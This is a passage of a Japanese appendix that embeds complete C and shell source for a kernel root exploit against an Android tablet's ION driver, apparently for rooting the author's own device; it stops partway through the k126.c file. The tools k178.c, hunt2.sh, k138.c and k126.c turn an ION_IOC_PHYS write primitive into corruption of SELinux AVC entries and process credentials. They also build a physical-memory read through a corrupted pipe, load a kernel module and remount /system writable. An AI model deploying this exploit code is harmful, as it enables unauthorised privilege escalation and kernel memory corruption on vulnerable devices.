# 付録: 完全なソースコード

`docs/charepa-root-full-story.md` が参照するプログラムの全文。
**リポジトリの `src/` に置いてあるファイルをそのまま埋め込んでいる。**
加工・省略はしていない。ビルドは `make tools` / `make module` で行う。

## ビルド環境

```
ホスト:        Linux x86_64（クロスコンパイル）
クロス:        aarch64-linux-gnu-gcc 14.2.0
フラグ:        -static -O2（-pthread を使うものは Makefile が付ける）
カーネルソース: ベンダー GPL ツリー（3.10.33、.config / System.map / vmlinux を含む）
モジュール:    vermagic 3.10.33 SMP preempt mod_unload aarch64
```

静的リンクにしているのは、走査の副作用で `/system/lib64` が壊れた状態でも
動作させるため。動的リンクのバイナリは `libm.so` の `DT_HASH` 破損で
起動できなくなることがあった。

---

## 収録ファイル一覧

パスはリポジトリ直下からの相対パス。

| パス | バイト | 行 | SHA-256（先頭 16 桁） |
| --- | ---: | ---: | --- |
| `src/tools/k178.c` | 10803 | 274 | `078c5d845fdeab64` |
| `src/tools/hunt2.sh` | 2235 | 60 | `d121b24b45c4fca8` |
| `src/tools/k138.c` | 10161 | 258 | `34d36dadc535fc43` |
| `src/tools/k126.c` | 7498 | 164 | `d89a18cfc9bc643d` |
| `src/tools/k145.c` | 8947 | 232 | `405890a38a7cfa71` |
| `src/tools/k169.c` | 12129 | 300 | `5e3a371e63c55269` |
| `src/tools/k37.c` | 4583 | 112 | `06dcdbfe860f000f` |
| `src/tools/k42.c` | 11660 | 303 | `044f9fb6fc729415` |
| `src/module/myroot.c` | 4661 | 136 | `748dc2e18b84b0f6` |
| `src/module/Makefile` | 821 | 25 | `07773cfa619cd363` |
| `src/tools/rw3.c` | 1831 | 47 | `5d260bf9fac8174d` |
| `src/tools/hook5.c` | 2700 | 64 | `1734f9b42a9dd22a` |
| `src/tools/install_hook.c` | 3067 | 70 | `d9c05f19c118b14f` |
| `src/tools/recov.c` | 2522 | 63 | `e1db31434da4db00` |
| `src/tools/modload.c` | 1378 | 35 | `6f0a3b3a2323694c` |
| `src/tools/chk.c` | 930 | 26 | `ac82494d0ecb1a28` |
| `src/tools/lsx.c` | 1210 | 32 | `7588a66206876d7a` |
| `src/tools/gtest.c` | 4624 | 110 | `6303607fb70976cb` |
| `src/tools/broot3.c` | 36887 | 851 | `209a10a9373ffa63` |

---

## A. 最終 root 取得ツール

### `src/tools/k178.c`

窓指定の root 取得（最終版）。AVC キャッシュの `avd.allowed` を書き換える。

```c
/* k178: one window per process, chosen at run time.
 *
 * The measurements that shape this design:
 *
 *     k172  full 2 GB, 938 stores before the node   -> panicked 6 s later
 *     k174  0x44000000 up, 45 stores               -> won, broke /system/bin later
 *     k175  0x4e000000..0x50000000, 664 stores     -> no win, DEVICE SURVIVED
 *     k176  full 2 GB                              -> died before writing a byte of log
 *
 * So the size of the scan, not the win itself, is what kills the tablet: 664 stores are
 * survivable, tens of thousands are not. And the node is not in a fixed place - k175's
 * window contained it on the boot where k174 ran and did not on the next one.
 *
 * Therefore the scan is split into windows and each window is a separate process. A window
 * that kills the device costs one window and a reboot; the damage does not persist across
 * a reboot, which the last recovery proved (toolbox ran again immediately afterwards).
 *
 * The tests are ordered so that the ones which must fail come first, because a failed probe
 * writes nothing:
 *
 *     gate(n+0) != 0     ssid is 0 or one of our fds   -> reject, nothing written
 *     gate(n+4) != 0     tsid likewise                -> reject, nothing written
 *     gate(n+8) == 0     the word is 4, so it stores at n+12 (avd.allowed)
 *
 * With only fd 4 holding a dma-buf, a zero word fails the gate, so the first two tests
 * reject both zeroes and non-matching values at no cost. Only a genuine 4 costs a write.
 *
 * Usage: k178 <lo> <hi>   both hexadecimal, e.g. k178 4e000000 50000000
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mount.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

struct cap_hdr { u32 version; int pid; };
struct cap_data { u32 eff, prm, inh; };

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define BASE_FD 2000
#define NALPHA 17
#define ION_SLOT 3000
#define CLASS_FD 4
#define NSLOT 21
#define OBJSZ 192
#define MAXCAND 4096
#define CAP_SYS_MODULE_BIT 16

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_raw(int *h, int *f, u32 *iv){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iv){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iv = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static u32 eff_of(int pid){
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}
static int try_module(void){
    static const char j[4] = { 0x7f, 'E', 'L', 'F' };
    errno = 0;
    syscall(105, j, 4UL, "");
    return errno;
}

/* after the win: load, prove, and try to make it durable */
static void finish(void)
{
    int fd = open("/data/local/tmp/myroot.ko", O_RDONLY);
    if (fd < 0){ say("  module missing errno=%d\n", errno); return; }
    char *mod = malloc(1 << 20);
    ssize_t got = read(fd, mod, 1 << 20);
    close(fd);
    errno = 0;
    long rc = syscall(105, mod, (unsigned long)got, "");
    say("  init_module rc=%ld errno=%d (%zd bytes)\n", rc, errno, got);
    if (rc != 0) return;

    say("  uid=%d euid=%d capget=0x%08x\n", getuid(), geteuid(), eff_of(0));
    {
        int p = open("/proc/myroot", O_WRONLY);
        if (p >= 0){ if (write(p, "1", 1) == 1) say("  /proc/myroot accepted a write\n"); close(p); }
        else say("  /proc/myroot errno=%d\n", errno);
    }
    const char *t[] = {"/proc/kmsg", "/dev/block/mmcblk0", "/init.rc", NULL};
    for (int i = 0; t[i]; i++){
        int f = open(t[i], O_RDONLY);
        say("  %-22s %s\n", t[i], f >= 0 ? "OPEN" : strerror(errno));
        if (f >= 0) close(f);
    }
    /* SELinux is off now, so a remount may finally be permitted */
    int r = mount(NULL, "/system", NULL, MS_REMOUNT, NULL);
    say("  remount /system rw: %s\n", r == 0 ? "OK" : strerror(errno));
    if (r == 0){
        int f = open("/system/.k178", O_CREAT|O_WRONLY, 0644);
        say("  write /system/.k178: %s\n", f >= 0 ? "OK" : strerror(errno));
        if (f >= 0) close(f);
    }
    say("  modules: ");
    { int f = open("/proc/modules", O_RDONLY);
      if (f >= 0){ char b[2048]; ssize_t n = read(f, b, sizeof b - 1);
        if (n > 0){ b[n] = 0; say("%s\n", strstr(b, "myroot") ? "myroot present" : "myroot ABSENT"); }
        close(f); } }
}

int main(int argc, char **argv)
{
    u32 lo = 0x4e000000u, hi = 0x50000000u;
    if (argc >= 3){
        lo = (u32)strtoul(argv[1], NULL, 16);
        hi = (u32)strtoul(argv[2], NULL, 16);
    }
    LOG = fopen("/data/local/tmp/k178.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k178 pid=%d uid=%d window 0x%08x..0x%08x\n", getpid(), getuid(), lo, hi);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);

    static int pad[4096]; int npp = 0;
    while (npp < 4090){
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) break;
        pad[npp++] = fd;
        if (fd >= BASE_FD - 1) break;
    }
    if (!npp || pad[npp-1] != BASE_FD - 1){ say("pad stopped at %d\n", npp?pad[npp-1]:-1); return 0; }

    static int ah[NALPHA], af[NALPHA]; static u32 aiv[NALPHA]; int na = 0;
    for (int i = 0; i < NALPHA; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(&h, &f, &iv)) break;
        ah[na] = h; af[na] = f; aiv[na] = iv; na++;
    }
    if (na < NALPHA){ say("alphabet short %d\n", na); return 0; }
    int i16 = -1;
    for (int i = 0; i < na; i++) if ((aiv[i] >> CAP_SYS_MODULE_BIT) & 1){ i16 = i; break; }
    say("17 buffers fd %d..%d, bit16 index=%d iova=0x%08x\n",
        af[0], af[na-1], i16, i16 >= 0 ? aiv[i16] : 0);
    if (i16 < 0) return 0;

    int keep = dup(af[i16]);
    if (keep < 0){ say("dup errno=%d\n", errno); return 0; }
    for (int i = 0; i < NALPHA; i++)
        if (dup2(af[i], BASE_FD + i) < 0){ say("dup2 %d failed\n", i); return 0; }

    /* phase A: cap_effective bit 16, one probe per slot over the whole range */
    int nul = open("/dev/null", O_RDONLY);
    if (nul >= 0) dup2(nul, 0);
    static u64 cand[MAXCAND]; int nc = 0;
    for (u32 p = 0x02000000u; p < 0x7f000000u && nc < MAXCAND; p += PGSZ){
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < NSLOT && nc < MAXCAND; i++){
            u64 o = pg + (u64)i * OBJSZ;
            if ((size_t)i * OBJSZ + 132 > PGSZ) break;
            if (gate(o + 4) != 0) continue;
            cand[nc++] = o;
        }
    }
    say("phase A: uid candidates=%d\n", nc);
    u64 mycred = 0;
    if (nc && dup2(keep, 0) >= 0){
        for (int i = 0; i < nc && !mycred; i++){
            u64 o = cand[i];
            if (gate(o + 52) != 0) continue;
            u32 e = eff_of(0);
            if (e != 0xFFFFFFFFu && (e & (1u << CAP_SYS_MODULE_BIT))){
                mycred = o;
                say("  cred 0x%llx eff=0x%08x\n", (unsigned long long)o, e);
            }
        }
    }
    say("  cred=0x%llx errno=%d\n", (unsigned long long)mycred, try_module());
    if (!mycred) return 0;

    /* narrow: fd 4 is the only dmabuf and it carries 0x80010000 */
    for (int i = 0; i < NALPHA; i++) close(BASE_FD + i);
    for (int i = 0; i < na; i++) if (af[i] != keep) close(af[i]);
    if (dup2(keep, CLASS_FD) < 0){ say("dup2 errno=%d\n", errno); return 0; }
    close(keep);
    if (dup2(CLASS_FD, 0) >= 0 && gate(mycred + 52) != 0)
        say("  warning: re-grant failed\n");
    { int n2 = open("/dev/null", O_RDONLY); if (n2 >= 0 && n2 != 0) dup2(n2, 0); }
    say("narrowed; PASS means word==%d; baseline errno=%d\n", CLASS_FD, try_module());

    /* phase B: the window */
    say("phase B: 0x%08x..0x%08x\n", lo, hi);
    long stores = 0, pages = 0; int win = 0; u32 winphys = 0;
    for (u32 p = lo; p < hi && !win; p += PGSZ){
        pages++;
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < PGSZ / 64; i++){
            u64 n = pg + (u64)i * 64;
            /* One probe. A miss writes nothing (dma_buf_get fails before the store),
             * and a hit writes n+12, which is avd.allowed. Extra pre-filters would
             * have to use the same gate, and any of them that succeeds also writes. */
            if (gate(n + 8) != 0) continue;
            stores++;
            if (try_module() == 8){
                win = 1; winphys = p;
                say("  WIN phys 0x%08x off %d after %ld stores\n", p, i * 64, stores);
                break;
            }
        }
        if ((pages & 0x7ff) == 0)
            say("  phys 0x%08x pages=%ld stores=%ld\n", p, pages, stores);
    }
    say("RESULT pages=%ld stores=%ld win=%d phys=0x%08x\n",
        pages, stores, win, winphys);
    if (!win){ say("no win in this window\n"); say("K178 done\n"); return 0; }

    /* phase C, immediately */
    finish();
    say("K178 done\n");
    return 0;
}
```

（10803 バイト / 274 行 / SHA-256 `078c5d845fdeab644f3e3eb292c5450af83bb5d7595ef9829eae2003bb83dce7`）

### `src/tools/hunt2.sh`

窓分割ハンター。`ADB_SERIAL` を環境変数で受け取り、窓ごとに k178 を回す。

```sh
#!/usr/bin/env bash
# hunt2.sh - walk the address space one window at a time until k178 reports win=1.
#
# Each window is a separate k178 process, so a window that kills the tablet costs one
# window and a power cycle, not the whole run. Device liveness is checked before every
# window, and the window list is ordered by how often the AVC node landed there during
# the session (42000000 first, then outward).
#
# Usage:
#     ADB_SERIAL=<serial> ./hunt2.sh [workdir] [logfile]
#
#   ADB_SERIAL  adb serial of the tablet (required). `adb devices` prints it.
#   workdir     directory holding the built k178 binary (default: .)
#   logfile     where to append progress (default: ./hunt2.log)
#
# The script never assumes sudo: set ADB_SUDO=1 if adb needs elevation on your host.
set -u

: "${ADB_SERIAL:?set ADB_SERIAL to the adb serial shown by 'adb devices'}"
WORKDIR="${1:-.}"
LOG="${2:-./hunt2.log}"

ADB=(adb)
if [ "${ADB_SUDO:-0}" = "1" ]; then
  ADB=(sudo -n adb)
fi

[ -x "$WORKDIR/k178" ] || { echo "k178 not found in $WORKDIR"; exit 2; }
mkdir -p "$(dirname "$LOG")"
exec >>"$LOG" 2>&1
echo "=== hunt2 $(date) serial=$ADB_SERIAL workdir=$WORKDIR ==="

wait_dev() {
  for _ in $(seq 1 60); do
    if "${ADB[@]}" devices 2>/dev/null | grep -q "$ADB_SERIAL	device"; then
      if timeout 8 "${ADB[@]}" exec-out "cat /proc/uptime" </dev/null 2>/dev/null | grep -q .; then
        return 0
      fi
    fi
    sleep 10
  done
  return 1
}

for lo in 42000000 4a000000 52000000 5a000000 62000000 02000000 0a000000 \
          12000000 1a000000 2a000000 32000000 3a000000 22000000 6a000000 72000000; do
  hi=$(printf '%08x' $((0x$lo + 0x08000000)))
  echo "--- window $lo..$hi $(date) ---"
  wait_dev || { echo "no device"; continue; }
  sleep 5
  "${ADB[@]}" push "$WORKDIR/k178" /data/local/tmp/k178 </dev/null 2>/dev/null
  "${ADB[@]}" shell "chmod 755 /data/local/tmp/k178" </dev/null 2>/dev/null
  timeout 300 "${ADB[@]}" shell "cd /data/local/tmp; ./k178 $lo $hi" </dev/null 2>/dev/null
  sleep 2
  R=$(timeout 20 "${ADB[@]}" exec-out "cat /data/local/tmp/k178.txt" </dev/null 2>/dev/null | grep -a "^RESULT")
  echo "$R"
  case "$R" in *win=1*) echo "*** WIN $lo ***"; exit 0;; esac
done
echo "=== no win $(date) ==="
exit 1
```

（2235 バイト / 60 行 / SHA-256 `d121b24b45c4fca8339a29e420c15f7f347e06b5e3dee952bc713c899a4ed52d`）

## B. プリミティブの実証ツール

### `src/tools/k138.c`

ゲート（`ION_IOC_PHYS`）が読み取り専用ではなくテスト兼書き込みであることの自己証明。

```c
/* k138: the gate is a test-AND-write, so aim it only at pages we own.
 *
 * What actually happened, from the panic logs:
 *
 *     k128  __wake_up_common walked a list whose head was in a freed page
 *     k135  avtab_search_node faulted right after the sweep began
 *
 * Both are explained by one fact I had wrong. ION_IOC_PHYS is not a read-only oracle:
 *
 *     struct ion_phys_data *data = (struct ion_phys_data *)arg;
 *     dmabuf = dma_buf_get(data->fd);     reads *(u32 *)arg
 *     data->addr = meta->iova;            WRITES *(u32 *)(arg + 4)
 *
 * Every probe that succeeds stores four bytes at probe+4. Sweeping the linear map with
 * gate() therefore wrote IOVAs all over kernel memory - wherever a probed word happened
 * to be zero, which is most of free RAM and many struct fields. The scans were never
 * read-only.
 *
 * Two consequences:
 *
 *   1. gate() cannot be used to search. It is a primitive that writes on success.
 *   2. to store W the probe must be W-4, because the store lands at probe+4.
 *
 * Both are now used deliberately. The plan:
 *
 *   - allocate ION pages, learn their physical addresses, ZERO them, free them
 *   - create pipes one at a time, one byte each. Each pipe needs a kmalloc-1024 slab for
 *     its bufs[] array, so the freed pages get taken as slab pages rather than data pages
 *   - for each known physical page P, probe P+8. On a bufs[] array, buf[0] is
 *     { page = struct page *, offset = 0, len = 1, ops = &anon_pipe_buf_ops }, so P+8
 *     holds offset 0 and the probe succeeds, storing the IOVA at P+12 - that is
 *     buf[0].len, and it becomes 0x80000000
 *   - a pipe whose buf[0].len is 0x80000000 returns 4096 bytes twice for a one-byte
 *     write, which is how the corrupted pipe is found
 *
 * Every probe is confined to a page we allocated and freed, so nothing outside our own
 * memory can be touched. The guard checks P+0, P+12 and P+16 are all non-zero before
 * probing P+8, which is what a real bufs[] array looks like and what a zeroed free page
 * does not.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
struct ion_sync_range_data { s32 fd; u32 offset, size, note; };

#define ION_IOC_ALLOC      _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE       _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE      _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM     _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS       _IOWR(ION_TYPE, 9, struct ion_phys_data)
#define ION_IOC_SYNC_RANGE _IOWR(ION_TYPE, 11, struct ion_sync_range_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define NPRIME 24
#define NPIPE 40

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk(size_t len, int bit, int *h, int *f, u32 *iova){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = len; a.heap_id_mask = 1u << bit; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iova){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iova = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static void syncr(int fd, u32 off, u32 size, u32 note){
    struct ion_sync_range_data sr;
    memset(&sr, 0, sizeof sr);
    sr.fd = fd; sr.offset = off; sr.size = size; sr.note = note;
    ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);
}

int main(void){
    LOG = fopen("/data/local/tmp/k138.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k138 pid=%d uid=%d\n", getpid(), getuid());
    say("the probe writes at probe+4, so probe P+8 to set buf[0].len at P+12\n");
    say("no address outside our own freed pages is ever probed\n");

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){ rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl); }
    ionfd = open("/dev/ion", O_RDWR);
    if (ionfd < 0){ say("open errno=%d\n", errno); return 0; }

    int gh, gf; u32 giv = 0;
    if (!mk(PGSZ, 0, &gh, &gf, &giv)){ say("marker failed\n"); return 0; }
    say("marker fd=%d iova=0x%08x\n", gf, giv);

    static int hh[NPRIME], ff[NPRIME]; u8 *mm[NPRIME]; u32 ph_[NPRIME]; int n = 0;
    for (int i = 0; i < NPRIME; i++){
        int h, f;
        if (!mk(PGSZ, 0, &h, &f, NULL)) break;
        u8 *m = mmap(NULL, PGSZ, PROT_READ|PROT_WRITE, MAP_SHARED, f, 0);
        if (m == MAP_FAILED) break;
        for (size_t off = 0; off + 8 <= PGSZ; off += 8){
            memcpy(m + off, &gf, 4);
            memcpy(m + off + 4, &(u32){0x6B6B6B6B}, 4);
        }
        syncr(f, 0, PGSZ, 4);
        hh[n] = h; ff[n] = f; mm[n] = m; ph_[n] = 0; n++;
    }
    say("allocated %d buffers\n", n);
    if (n < 8) return 0;

    /* identify by requiring all 512 slots to answer; fd 0 is not a dmabuf yet so only
     * gf answers, which makes the identification unambiguous */
    int found = 0;
    for (u32 ph = 0x01000000; ph + PGSZ <= 0x80000000u && found < n; ph += PGSZ){
        u64 al = (u64)PAGE_OFFSET_V + ph - MEMSTART;
        if (gate(al) != 0) continue;
        int all = 1;
        for (size_t off = 8; off + 8 <= PGSZ; off += 8)
            if (gate(al + off) != 0){ all = 0; break; }
        if (all){ ph_[found] = ph; found++; }
    }
    say("identified %d/%d\n", found, n);
    if (found < 8) return 0;
    for (int i = 0; i < found; i++) say("  phys=0x%08x\n", ph_[i]);

    /* zero and free the ones above _text so that a slab, not the image, takes them */
    int nfree = 0;
    for (int i = 1; i < found; i++){
        memset(mm[i], 0, PGSZ);
        syncr(ff[i], 0, PGSZ, 4);
        munmap(mm[i], PGSZ);
        { struct ion_handle_data h; h.handle = hh[i]; ioctl(ionfd, ION_IOC_FREE, &h); }
        close(ff[i]);
        hh[i] = ff[i] = -1;
        ph_[nfree + 1] = ph_[i];
        nfree++;
    }
    say("freed %d zeroed pages\n", nfree);

    if (dup2(gf, 0) < 0){ say("dup2 errno=%d\n", errno); return 0; }
    say("fd 0 = marker dmabuf: the probe also accepts the word 0\n");

    /* pipes, one byte each: kmalloc-192, kmalloc-1024, then a data page */
    say("--- %d pipes, one byte each ---\n", NPIPE);
    static int pp[NPIPE][2]; int np = 0;
    for (int i = 0; i < NPIPE; i++){
        if (pipe(pp[np]) < 0) break;
        char c = 'x';
        if (write(pp[np][1], &c, 1) < 0) break;
        np++;
    }
    say("  %d pipes\n", np);

    /* probe only at P+8 on our own pages */
    say("--- probing P+8 on %d known pages ---\n", nfree);
    int fired = 0;
    for (int i = 1; i <= nfree; i++){
        u32 p = ph_[i];
        if (p < 0x01080000u) { say("  skip 0x%08x (below _text)\n", p); continue; }
        u64 al = (u64)PAGE_OFFSET_V + p - MEMSTART;
        int g0 = gate(al + 0);
        int g12 = gate(al + 12);
        int g16 = gate(al + 16);
        say("  page 0x%08x: [+0]=%s [+12]=%s [+16]=%s\n",
            p, g0 ? "nz" : "ZERO", g12 ? "nz" : "ZERO", g16 ? "nz" : "ZERO");
        if (g0 == 0 || g12 == 0 || g16 == 0){
            say("    looks like a fresh zero page, not a bufs array: not probing +8\n");
            continue;
        }
        errno = 0;
        int rc = gate(al + 8);
        say("    probe(+8) rc=%d errno=%d\n", rc, errno);
        if (rc == 0) fired++;
    }
    say("  probes that succeeded: %d\n", fired);

    /* did any pipe become unbounded? */
    say("--- testing the pipes ---\n");
    u8 *buf = malloc(PGSZ);
    int victim = -1;
    for (int i = 0; i < np; i++){
        ssize_t r1 = read(pp[i][0], buf, PGSZ);
        if (r1 != PGSZ) continue;
        ssize_t r2 = read(pp[i][0], buf, PGSZ);
        if (r2 == PGSZ){ victim = i; break; }
    }
    if (victim < 0){
        say("  no pipe returned an oversized read\n");
        free(buf);
        say("K138 done (no read primitive)\n");
        return 0;
    }
    say("  *** pipe %d returned 4096 twice for a one-byte write ***\n", victim);

    say("--- walking physical memory ---\n");
    long scanned = 0;
    long banner_at = -1;
    while (scanned < (600L*1024*1024)){
        ssize_t r = read(pp[victim][0], buf, PGSZ);
        if (r <= 0){ say("  stopped at %ld MB (r=%zd errno=%d)\n",
                          scanned/(1024*1024), r, errno); break; }
        if (banner_at < 0){
            void *q = memmem(buf, r, "Linux version", 13);
            if (q) banner_at = scanned + ((u8*)q - buf);
        }
        scanned += r;
        if (banner_at >= 0) break;
    }
    say("  walked %ld MB\n", scanned/(1024*1024));

    say("--- result ---\n");
    if (banner_at >= 0){
        say("  \"Linux version\" found at stream offset %ld\n", banner_at);
        if ((u32)banner_at < 0x01735090u)
            say("  => read origin phys = 0x%08x\n", 0x01735090u - (u32)banner_at);
        say("  the linear map is readable from userspace\n");
    } else {
        say("  the read worked but the banner was not in the first %ld MB\n",
            scanned/(1024*1024));
    }
    free(buf);
    say("K138 done\n");
    return 0;
}
```

（10161 バイト / 258 行 / SHA-256 `34d36dadc535fc4316114c3cbb72caea153f24b89c6076ab8240c9b4becab6f6`）

### `src/tools/k126.c`

IOVA → ケーパビリティ対応表の実測。

```c
/* k126: CAP_SYS_ADMIN is reachable after all - and it is the strongest one available.
 *
 * For many rounds the store value was treated as fixed at 0x80000000, so the only
 * capability obtainable was bit 31, CAP_SETFCAP. That was wrong.
 *
 * The stored value is meta->iova, and the IOVA allocator hands out
 * 0x80000000 + k*4096 for the k-th page of the mapping. So the value we write is
 *
 *     0x80000000 | (k << 12)
 *
 * which means bits 12..30 of the value are ARBITRARY - they are just the page index.
 * Bit 31 is always set, and bits 0..11 are always zero, but everything in between can
 * be chosen by allocating enough buffers to walk k up to the value we want.
 *
 * Written into cred+56 (the low half of cap_effective) that gives us any capability
 * in the range 12..31, plus CAP_SETFCAP:
 *
 *     k = 0x200   ->  iova 0x80200000  ->  bit 21 = CAP_SYS_ADMIN
 *     k = 0x2F0   ->  iova 0x802f0000  ->  bits 16,17,18,19,21,31 at once
 *
 * Cost: one 4 KB ION buffer per step, so k = 0x200 costs 513 pages = 2 MB. That is
 * affordable, and it is why this is worth doing rather than settling for CAP_SETFCAP.
 *
 * CAP_SYS_ADMIN is in turn the key that opens several doors at once:
 *
 *   - setxattr of any security.* attribute other than security.capability is gated
 *     purely on capable(CAP_SYS_ADMIN) in selinux_inode_setotherxattr
 *   - security_kernel_module_from_file is a no-op here: SELinux does not register it
 *     and security_fixup_ops fills it with cap_kernel_module_from_file() which
 *     returns 0, so init_module() is gated only on capable(CAP_SYS_MODULE) and
 *     modules_disabled - and modules_disabled is 0
 *   - CAP_SYS_MODULE is bit 16, reachable at k = 0x10, so module loading needs only
 *     17 pages of ION
 *
 * This program measures the mapping rather than assuming it: it allocates buffers
 * until the reported IOVA carries the capability bit it wants, and prints the exact
 * value that will be stored. It performs no kernel store.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PGSZ 4096

static FILE *LOG;
static void say(const char *fmt, ...){
    char b[400]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static const char *capname(int c){
    static const char *n[32] = {
        "CAP_CHOWN","DAC_OVERRIDE","DAC_READ_SEARCH","FOWNER","FSETID","KILL",
        "SETGID","SETUID","SETPCAP","LINUX_IMMUTABLE","NET_BIND_SERVICE","NET_BROADCAST",
